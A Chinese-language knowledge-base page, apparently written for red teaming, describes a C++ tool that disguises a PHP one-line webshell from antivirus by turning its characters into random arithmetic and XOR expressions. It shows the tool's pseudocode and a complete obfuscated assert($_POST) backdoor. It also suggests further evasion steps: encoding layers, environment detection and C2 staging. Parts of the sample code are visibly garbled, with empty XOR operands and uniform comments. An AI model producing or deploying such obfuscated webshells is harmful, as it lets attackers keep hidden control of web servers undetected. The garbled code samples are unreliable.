---
title: 'PHP Webshell Obfuscation: Two-Stage Arithmetic & XOR Splitting for AV Evasion'
description: 'Deep dive into a C++ tool implementing two-stage PHP webshell obfuscation:
  Stage 1 splits characters into randomized arithmetic expressions (binary to quinary
  operations); Stage 2 XOR-splits characteristic functions (chr, assert) into character
  pairs. Uses time-based randomization for polymorphic output per build.'
category: program-analysis
tags:
- PHP
- Webshell
- Obfuscation
- AV Evasion
- C++
- Polymorphic Code
- Arithmetic Expression Splitting
- XOR Obfuscation
- Regex Bypass
- Red Teaming
date: 2025-01-15
updated: '2026-11-14'
---

## 概述

本页面记录一款 C++ 实现的 PHP 一句话木马混淆工具，通过**两阶段混淆**绕过基于正则表达式的静态查杀：

1. **第一阶段（codeconfuse）**：将每个字符拆解为随机生成的多元算术表达式（二元~五元），再由 `chr()` 还原
2. **第二阶段（orderconfuse）**：对第一阶段产生的特征函数（`chr`、`assert` 等）进行异或字符对拆解

工具利用**时间种子随机化**，同一输入每次生成不同混淆结果，具备多态性。

---

## 核心架构：三大类设计

```
┌─────────────────────────────────────────────────────────────┐
│                      foperation                             │
│  文件读写操作类：逐行读取待混淆文件，写入混淆后的 PHP 文件    │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      codeconfuse                            │
│  初级表达式混淆：字符 → 随机多元算术表达式 → chr(expr)      │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      orderconfuse                           │
│  二级异或拆分：chr/assert 等特征函数 → ('A'^'B') 形式       │
└─────────────────────────────────────────────────────────────┘
```

### foperation 类 —— 文件 I/O 与流程编排

**职责**：
- 读取源文件（仅需木马核心代码，**无需 `<?php ?>` 标签**）
- 调用 `codeconfuse` 完成第一阶段混淆
- 调用 `orderconfuse` 完成第二阶段混淆
- 写入最终混淆文件（自动添加 `<?php` 头和 `?>` 尾）

**关键成员**：
```cpp
ifstream rFile;           // 读文件句柄
ofstream wFile;           // 写文件句柄
char charCache[1024];     // 行缓冲
string lineResultText;    // 两阶段混淆后的结果
int lineCharIndex;        // 当前行字符索引
```

**核心流程**（`main()` 中体现）：
```cpp
fop.setLineResultText("<?php");  // 写入头标签
fop.writeLineText();

while (fop.readLineText()) {
    string result;
    while (char ch = fop.getLineChar()) {
        codeC.setData(ch, rand()%3+2);  // 运算元数 2~4
        string str = codeC.getResult(); // 获取算术表达式
        str = "chr" + str + '.';        // 包裹 chr()
        result += str;
    }
    result[result.length()-1] = ' ';    // 替换末尾 '.'
    result = orderC.confuse(result);    // 二阶段混淆
    fop.setLineResultText(result);
    fop.writeLineText();
}
fop.setLineResultText("?>");            // 写入尾标签
```

---

## 第一阶段：codeconfuse —— 算术表达式多态拆分

### 设计目标

将单字符 `c`（ASCII 值 `v`）转形为：
```
chr( ((random_expr) op proofValue op separationFactor) )
```
使得：
- 表达式结构随机（`+ - * / ^` 五种运算）
- 运算元个数可配置（2~5+）
- 同一字符每次生成**完全不同**的表达式
- 最终 `chr()` 计算结果仍为原字符

### 核心算法流程

```
输入字符 c
    │
    ▼
dataProcessing()
    │
    ├─► createBigInteger()     // 基于 time(NULL) 生成大随机数 bigInteger
    │
    ├─► charSplit()            // 将字符值 v 拆解为：
    │       proofValue (待校验值)
    │       separationFactor (拆分因子)
    │       flag (拆分运算类型: + - * / ^)
    │
    ▼
dataVerification(opNumber)     // 构建完整表达式
    │
    ├─► 随机生成 (opNumber-1) 个子表达式
    │       addSplit / subSplit / mulSplit / divSplit / xorSplit
    │       每个子表达式基于 bigInteger 衍生，并随机加括号
    │
    ├─► 将 proofValue 与 separationFactor 融入表达式中间位置
    │       (避免固定尾部 +proofValue -separationFactor 特征)
    │
    ▼
返回完整表达式字符串，如：
  "(((2131) - 412) - 1714) * 23"
  "((((597) * 3) - -115268) / 1159)"
  "((((713834) / 457) - -15) ^ 1627)"
```

### 关键技术点

| 技术点 | 实现细节 |
|--------|----------|
| **随机化种子** | `srand((unsigned)time(NULL))` + `rand() % 10000` 作为 `randomRoot` |
| **大数生成** | `bigInteger = rand() * randomRoot` 量级，保证表达式数值足够大 |
| **括号随机化** | `addBrackets()` 以 50% 概率为子表达式添加一层括号 |
| **运算类型枚举** | `splitFlag { addSplit, subSplit, mulSplit, divSplit, xorSplit, notSplit }` |
| **校验值融合** | `proofValue` 与 `separationFactor` 不固定置尾，插入表达式中段 |
| **运算元数量** | `operationNumber = rand()%3+2` → 2~4 元，理论支持 5+ |

### 混淆效果对比

**原始代码**：
```php
assert($_POST['x']);
```

**第一阶段输出**（节选，`chr()` 特征明显）：
```php
chr(-1605+1702).chr(1186 - 1071).chr((((2131) - 412) - 1714) * 23)
.chr((((597) * 3) - -115268) / 1159).chr((((713834) / 457) - -15) ^ 1627)
...
```

---

## 第二阶段：orderconfuse —— 特征函数异或拆分

### 设计目标

消除第一阶段残留的高频特征：
- `chr` 函数名
- `assert` 等执行函数名
- 变量赋值结构 `$var=...`

### 异或拆分原理

利用字符异或性质：`A ^ B = C` ⟺ `C ^ B = A` ⟺ `C ^ A = B`

将目标字符 `C` 拆解为两个**可打印、非空白**字符 `A`、`B`：
```php
'C'  →  ('A' ^ 'B')
```

**连接方式**：多个异或表达式用 `.` 拼接
```php
(' '^'c').(''^'k').(''^'t')  // 拼接成 "chr"
```

### 字符对搜索算法

```cpp
string confuseChr() {
    // 遍历可打印字符范围，寻找 A^B = targetChar
    // 随机化起始索引 → 同字符每次产出不同字符对
    for (int i = randomStart; i < 127; i++) {
        for (int j = 32; j < 127; j++) {
            if ((i ^ j) == targetChar && isPrintable(i) && isPrintable(j)) {
                return "('" + char(i) + "'^'" + char(j) + "')";
            }
        }
    }
}
```

**过滤规则**：
- `isspace()` 排除空白字符
- 手工黑名单排除：`'`, `"`, `\`, `?`, `>` 等 PHP 语法敏感字符
- 仅保留可见可打印字符（ASCII 32~126）

### 混淆目标

| 目标 | 处理方式 |
|------|----------|
| `chr` | 全部拆解为异或字符对 |
| `assert` | 拆解为异或字符对，赋给随机变量名 |
| 变量名 (`$a`, `$b`...) | 保持为随机单字母变量，不再拆解 |
| 算术表达式 | **保持不变**（核心混淆载体） |

---

## 完整混淆示例

### 输入
```php
assert($_POST['x']);
```

### 最终输出
```php
<?php
$h=(' '^'c').(''^'k').(''^'t');   // "chr"
$d=(''^'m').(''^'f').(''^'b');    // "chr"
$a=(''^'p').(''^'~').(''^'h');    // "chr"
$S=(''^'~').('!'^'I').('$'^'V');  // "chr"
$U=('*'^'I').('*'^'B').('-'^'_'); // "chr"
$S=('1'^'R').(''^'j').(''^'w');   // "chr" (变量复用)
$P=(''^'k').(''^'f').(''^'}');    // "chr"
$M=(''^'q').(''^'}').(''^'k');    // "chr"
$J=(''^'').(''^'w').('#'^'Q');   // "chr"
$H=('&'^'E').('*'^'B').(','^'^'); // "chr"
$E=('0'^'S').(''^'i').(''^'v');   // "chr"
$B=(''^'d').(''^'f').(''^'|');    // "chr"
$y=(''^'r').(''^'|').(''^'j');    // "chr"
$v=(''^'x').(''^'v').('#'^'Q');   // "chr"
$t=('%'^'F').('*'^'B').('+'^'Y'); // "chr"
$q=('/'^'L').(' '^'h').(''^'q');  // "chr"
$n=(''^'e').(''^'f').(''^'|');    // "chr"
$k=(''^'s').(''^'{').(''^'e');    // "chr"
$i=(''^'y').(''^'u').('!'^'S');   // "chr"
$f=('$'^'G').('*'^'B').('*'^'X'); // "chr"
$c=('.'^'O').('1'^'B').(''^'q').('^'`').(''^'|').(''^'z'); // "assert"

$c($h(-1605+1702).$d(1186-1071).$a((((2131)-412)-1714)*23)
.$S((((597)*3)- -115268)/1159).$U((((713834)/457)- -15)^1627)
.$S((1172- -165868)/1440).$P((1632- -75368)/1925).$M(-1681+1717)
.$J((((1004241)/679)-1474)*19).$H((((208)^1092)- -90)-1182)
.$E((((1807)-542)-2731)+1545).$B((1133-3061)+2011)
.$y((((777)*2)- -114)-1584).$v((1687-1680)*13).$t(73203/1877)
.$q((1416- -414)-1710).$n((((2089)-972)-1114)*13)
.$k(149079/1603).$i((1756- -55849)/1405).$f(-1959+2018) );
?>
```

### 执行效果

混淆后文件**可直接作为 PHP 脚本执行**，`$_POST['x']` 参数内容会被 `assert()` 评估执行，达到一句话木马功能。

---

## 优势与局限性分析

### ✅ 优势

| 维度 | 说明 |
|------|------|
| **多态性** | 基于 `time(NULL)` 随机种子，同一输入每次构建产出完全不同的文件内容 |
| **无加解密存根** | 纯代码结构变换，无 `eval(gzinflate(base64_decode(...)))` 类解密特征 |
| **正则绕过** | 算术表达式结构随机、括号位置随机、运算符随机，难以用固定正则覆盖 |
| **字符级粒度** | 逐字符混淆，无完整字符串字面量残留 |
| **工程化分层** | 三类职责分离，易于扩展（如增加第三阶段编码） |

### ⚠️ 局限与已知问题

| 问题 | 影响 | 备注 |
|------|------|------|
| **注释处理缺失** | 若源文件含注释，可能被误混淆导致语法错误 | 未测试能否执行 |
| **禁止 `<?php ?>` 写入源文件** | 若源文件已含标签，输出文件会嵌套标签导致解析失败 | 设计缺陷，需后期修复 |
| **两阶段特征分层明显** | 上半部全是异或字符对，下半部全是算术表达式，结构指纹明显 | 作者建议增加第三阶段加密 |
| **括号冗余过多** | 表达式括号嵌套极深，可能触发 PHP 解析器限制或静态分析启发式 | 需优化括号位置算法 |
| **仅对抗静态特征匹配** | 若对方部署**行为检测**（沙箱执行、RASP、WAF 语义分析），绕过效果趋近于零 | 文档明确指出 |
| **未测试 5+ 元运算** | 理论可行但未实测稳定性 | - |

---

## 检测对抗视角

### 静态特征提取难点

| 特征类型 | 传统查杀方式 | 本工具对抗效果 |
|----------|--------------|----------------|
| 函数名 `assert`/`chr` | 正则 `\b(assert|chr)\b` | ✅ 完全拆解为异或表达式 |
| 变量赋值模式 | `\$\w+\s*=` | ⚠️ 变量名随机单字母，模式仍存在 |
| `chr(数字)` | `chr\(\s*\d+\s*\)` | ✅ 数字被展开为复杂表达式 |
| Base64/gzip 存根 | `base64_decode|gzinflate` | ✅ 无编码存根 |
| 固定字符串 | 字面量匹配 | ✅ 无完整字面量 |

### 行为检测绕过建议（超出工具范围）

- 结合 **PHP 协议封装器**（`php://filter`、数据流转换）隐藏执行流
- 使用 **动态函数调用** + 变量函数名（本工具已部分体现：`$c(...)`）
- 对接 **C2 框架**（如 [[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]）实现流量混淆
- 部署 **重定向器**（[[c2-redirectors-malleable-c2-profiles]]）隐匿 C2 基础设施

---

## 关联技术生态

### 红队基础设施与免杀链

| 环节 | 相关知识页 |
|------|------------|
| C2 通信隐匿 | [[c2-redirectors-malleable-c2-profiles]]、[[smb-named-pipe-c2-communication]] |
| Beacon 变体与 External C2 | [[cobalt-strike-external-c2-smb-beacon]] |
| .NET 免杀与 CLR 日志篡改 | [[dotnet-clr-usage-log-tampering-edr-evasion]] |
| 内存注入与模块隐藏 | [[phantom-dll-hollowing-technique]]、[[pe-manual-mapping-loader-implementation]] |
| 硬件级初始访问 | [[badusb-hid-attack-arduino-leonardo]] |

### Web 攻击面与靶场实战

| 场景 | 相关知识页 |
|------|------------|
| 文件上传绕过 Getshell | [[vulnhub-bbs-cute-102-writeup]]、[[edu-src-penetration-test-case-study]] |
| PHP 反序列化/代码执行链 | [[vulnhub-chronos-writeup]] (Node.js 原型链污染对比) |
| 靶场综合实战索引 | [[vulnhub-platform-resource-index]] |

### 二进制分析与逆向工程基础

| 基础技能 | 相关知识页 |
|----------|------------|
| PE 结构与手动映射 | [[pe-manual-mapping-loader-implementation]]、[[pe-export-table-internals]]、[[pe-import-table-internals]] |
| Windows 系统调用内幕 | [[windows-syscall-internals-sysenter-kifastcallentry]] |
| 栈溢出与 Shellcode 编写 | [[windows-x86-stack-overflow-shellcode-execution]]、[[rop-linux-x86-beginner-tutorial]] |
| IDA Pro 实战技巧 | [[ida-pro-tips-plugins-python]] |

---

## 代码复现与改进方向

### 编译环境

- **语言**：C++11/14
- **平台**：Windows (依赖 `<windows.h>`、MSVC 兼容)
- **标准库**：`<iostream>`、`<fstream>`、`<string>`、`<cstdlib>`、`<ctime>`

### 改进建议（按优先级）

1. **修复文件操作缺陷**
   - 源文件自动剥离 `<?php ?>` 标签
   - 忽略 `//`、`/* */` 注释块

2. **第三阶段：整体编码/加密**
   - 对二阶段输出整体 Base64/RC4/自定义编码
   - 运行时解码 `eval(decode(...))`，但需权衡解密存根特征

3. **表达式结构多样化**
   - 引入三元运算符 `?:`、位运算 `<< >> | & ~`
   - 随机插入无效代码分支（`if(0){...}`、死代码）

4. **变量名与结构随机化**
   - 变量名长度随机（1~8 字符）、字符集扩展
   - 打乱语句顺序、插入垃圾赋值语句

5. **跨平台支持**
   - 移除 `<windows.h>` 依赖，适配 Linux/macOS 编译
   - 命令行参数化（`argparse` 风格），便于 CI/CD 集成

6. **对抗行为分析**
   - 引入环境检测（`php_sapi_name()`、扩展模块枚举）
   - 延迟执行、分阶段加载（配合 [[cobalt-strike-external-c2-smb-beacon]] 分阶段加载思路）

---

## 总结

本工具展示了**代码结构层面的多态混淆**思路：
- **第一阶段**将数据（字符）转化为**计算过程**（算术表达式），消除字面量
- **第二阶段**将控制流关键标识（函数名）转化为**字符运算**（异或），消除关键词特征
- **时间种子随机化**实现构建级多态，对抗静态特征库

但其本质仍是 **静态对抗**，对动态行为分析、语义引擎、RASP 等运行时防护**无效**。实战免杀需结合 **加载器免杀、内存执行、流量混淆、基础设施隐匿** 等全链路对抗体系（参考上文「关联技术生态」各知识页）。

---

## 交叉引用索引

- **C2 基础设施与流量混淆**：[[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]、[[smb-named-pipe-c2-communication]]
- **内存执行与模块隐藏**：[[phantom-dll-hollowing-technique]]、[[pe-manual-mapping-loader-implementation]]
- **EDR 规避技术**：[[dotnet-clr-usage-log-tampering-edr-evasion]]、[[named-pipe-smb-detection-sysmon]]
- **Web 攻击链实战**：[[vulnhub-bbs-cute-102-writeup]]、[[edu-src-penetration-test-case-study]]、[[vulnhub-platform-resource-index]]
- **二进制分析基础**：[[pe-export-table-internals]]、[[pe-import-table-internals]]、[[windows-syscall-internals-sysenter-kifastcallentry]]、[[ida-pro-tips-plugins-python]]
- **硬件初始访问**：[[badusb-hid-attack-arduino-leonardo]]
- **逆向工程入门**：[[reverse-engineering-beginner-learning-path]]、[[crackme-analysis-keygen-development-case-study]]

---

*页面维护者：数字知识库策展人*  
*最后更新：2025-01-15*  
*来源归档：0w1Club 微信公众号文章《对PHP一句话混淆来绕过正则匹配查杀》*

## 来源

- [0x00实验室-202108-202304_035](../sources/0x00实验室-202108-202304_035.md)
